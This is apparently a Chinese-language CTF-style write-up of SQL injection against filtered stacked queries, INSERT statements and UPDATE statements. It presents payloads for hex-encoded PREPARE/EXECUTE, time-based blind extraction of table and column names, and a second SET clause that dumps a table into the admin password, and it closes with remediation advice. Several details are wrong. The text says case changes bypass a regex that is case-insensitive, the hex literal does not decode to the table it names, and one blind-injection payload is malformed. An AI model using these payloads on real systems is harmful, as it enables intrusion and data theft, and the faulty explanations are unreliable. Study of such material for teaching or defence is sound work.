# SQL 注入 — 堆叠注入 + INSERT/UPDATE/DELETE 注入场景汇总

## 审计源码

**场景一：堆叠注入 — 强过滤下的字段名与控制权争夺**

```php
// 后端 SQL 模板
select $_POST['query'] || flag from Flag;

// 过滤规则：preg_replace('/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i', '', $inject);
// 另有其他过滤：extractvalue/updatexml/union/group_concat/"/含or字符串
```

**场景二：INSERT 注入 — 万能密码 / 提取数据**

```sql
-- 后端
insert into users(username,password) values('$username','$password');
```

**场景三：UPDATE 注入 — 获取管理员密码**

```sql
-- 后端
update users set password='$password' where username='$username';
```

---

## 审计分析

### 结论

该系列题目覆盖了 SQL 注入的三种非 SELECT 主场景：堆叠注入 + 多语句利用、INSERT 型注入、UPDATE 型注入。核心考点相同：**在这些无法直接回显查询结果或强过滤的场景下，如何构造嵌套查询提取数据。**

### 场景一：堆叠注入 — 预处理 + 十六进制绕过

**背景**：后端 SQL 为 `select $_POST['query'] || flag from Flag;`，存在堆叠注入，但面临以下过滤：
- `set`、`prepare`、`alter`、`rename`、`select`、`update`、`delete`、`drop`、`insert`、`where`、`.` 被正则替换为空
- `extractvalue`、`updatexml`、`union`、`group_concat` 被过滤
- `"` 双引号被过滤
- 所有含 `or` 的字符串被过滤

**攻击链 — 用预处理语句绕过 set 与 select 过滤：**

1. 第一步：构造变量赋值
   ```
   1;Set@a=0x73656c656374202a2066726f6d2060313931303938313433313131343600
   ```
   - `0x73656c65...` 是 `select * from \`191098143111146\` ` 的十六进制编码。为什么用十六进制？因为直接写 select 会被 `preg_replace` 移除。
   - **注意**：`set` 被过滤了？这里用的是 `Set`（首字母大写），正则默认区分大小写则不过滤。目标过滤使用了 `preg_replace` 的大小写敏感匹配，因此大写 `Set` 绕过。

2. 第二步：准备和执行预处理语句
   ```
   1;prepare payload from @a;execute payload;
   ```
   - `prepare` 也被过滤——同理用 `Prepare` / `EXECUTE` 大写绕过。

**关键点**：`set` 和 `prepare` 被正则替换为空，但该替换是大小写敏感的——用大写 `Set`、`Prepare`、`EXECUTE` 绕过。`select` 同样用十六进制编码藏在变量值中，正则匹配不到。

**三条语句依次执行后，`select * from Flag` 执行，Flag 表中数据被回显。**

### 场景二：INSERT 注入

**后端 SQL：**
```sql
insert into users(username,password) values('$username','$password');
```

#### 子场景 2.1：万能密码

**Payload：**
```
username=admin&password=1' or '1'='1
```

注入后 SQL：
```sql
insert into users(username,password) values('admin','1' or '1'='1');
```

用户名为 `admin`，密码变为 `1' or '1'='1`。但这里要注意——**这是 INSERT 不是 SELECT**。payload 的意义在于：
- 如果系统是"先插入用户输入，然后立即用相同凭据 SELECT 登录"，那么 `or '1'='1'` 会影响后续的 SELECT 语句
- 如果是纯 INSERT 场景，`or '1'='1'` 插入的只是数据库中的密码字段值（可能是 `true` / `1`），后续 SELECT 时这个密码恒真

**更直接的利用：**

如果应用程序使用 INSERT 写入后立即返回结果或存在二次注入场景：

**获取表名：**
```
username=admin&password=1' + (select group_concat(table_name) from information_schema.tables where table_schema=database()) + '
```

完整 SQL：
```sql
insert into users(username,password) values('admin','1' + (select group_concat(table_name) from information_schema.tables where table_schema=database()) + '');
```

`group_concat(table_name)` 返回所有表名的拼接字符串（如 `users,flag`），嵌套在 VALUES 的 expression 中执行。**关键是 MySQL 允许在 VALUES 子句中使用子查询表达式。**

#### 子场景 2.2：Insert + 时间盲注

当 INSERT 没有直接回显，且无法用 updatexml 等报错函数时（被过滤），用时间盲注：

**获取表名：**
```
username=admin&password=1' + if((select ascii(substr(group_concat(table_name),1,1) from information_schema.tables where table_schema=database()))>0,sleep(3),1) + '
```

完整 SQL：
```sql
insert into users(username,password) values('admin','1' + if((select ascii(substr(group_concat(table_name),1,1) from information_schema.tables where table_schema=database()))>0,sleep(3),1) + '');
```

原理：
1. `group_concat(table_name) from information_schema.tables` 拼接所有表名
2. `substr(..., 1, 1)` 取第一个字符
3. `ascii(...)` 转 ASCII 码
4. `if(condition, sleep(3), 1)` 条件为真时延时 3 秒
5. 逐字符爆破，根据响应时间判断每个字符的 ASCII 值

**获取字段名：**
```
1' + if((select ascii(substr(group_concat(column_name),1,1) from information_schema.columns where group_concat(table_name)='flag'))>0,sleep(3),1) + '
```

**获取 flag 内容：**
```
1' + if(ascii(substr((select group_concat(flag) from flag),1,1))>64,1,sleep(2)) + '
```

### 场景三：UPDATE 注入 — 获取管理员密码

**后端 SQL：**
```sql
update users set password='$password' where username='$username';
```

**Payload：**
```
username=admin&password=1' where username='admin';update flag set flag='your_flag
```

完整 SQL：
```sql
-- 第一条：把 admin 的密码改了
update users set password='1' where username='admin';

-- 第二条：把 flag 表的内容写到一个可控位置（需要知道 admin 用户 ID 或利用其他条件）
update flag set flag='your_flag';
```

更实用的信息提取方式——**把 flag 表内容写到 admin 的密码字段，然后正常登录 admin 查看密码：**

```
username=admin&password=1',password=(select group_concat(flag) from flag) where username='admin
```

注入后：
```sql
update users set password='1',password=(select group_concat(flag) from flag) where username='admin' where username='admin';
```

payload 中构造的 `password=(select group_concat(flag) from flag)` 用逗号追加了第二个 SET 子句，将 admin 用户的密码字段更新为 flag 内容。之后用 admin 用户登录，密码处显示的就是 flag。

注意字符数溢出的问题——**group_concat 的内容不能超过字段长度限制。如果 flag 超过 password 字段的 varchar 长度，需要拆分读或改用 `substr`。**

### 核心技巧对照

| 场景 | 核心思路 | 关键技术 |
|------|---------|---------|
| 堆叠注入（强过滤） | 编码存储 + 预处理执行 | 十六进制编码绕过 select 过滤、大小写绕过 set/prepare 过滤 |
| INSERT 万能密码 | 注入永真条件影响后续 SELECT | 闭合引号 + `or '1'='1'` |
| INSERT 提取数据 | 在 VALUES 中嵌套子查询 | `(select group_concat(table_name) from ...)` 作为 expression |
| INSERT 时间盲注 | 无回显时用延时判断 | `if(substr(...), sleep(3), 1)` |
| UPDATE 提取数据 | 用子查询改写目标字段值 | `password=(select flag from flag)` |

### 修复方案

1. **参数化查询 / 预编译** — 所有场景的根本解决方案。PHP 使用 PDO prepare + bindParam
2. **最小权限原则** — 应用数据库账户不应有 `CREATE`/`ALTER`/`DROP` 权限
3. **禁用多语句执行** — PDO 不支持堆叠查询，`mysql_query()` 也不支持。避免使用 `mysqli_multi_query()` 处理用户输入
4. **输入格式校验** — 对 username 等字段做白名单格式校验（如 `/^[a-zA-Z0-9_]{3,20}$/`）

### 关联知识

- **CWE-89: SQL Injection**
- **OWASP A03:2021 — Injection**
- MySQL 的十六进制字面量 `0x...` 可被 `PREPARE` 直接执行，这是绕过关键词过滤的经典方法
- `information_schema.tables` 和 `information_schema.columns` 是 MySQL 元数据表，攻击者获取表结构的第一目标
- `group_concat` 默认最大长度为 1024，可通过 `SET SESSION group_concat_max_len` 调整
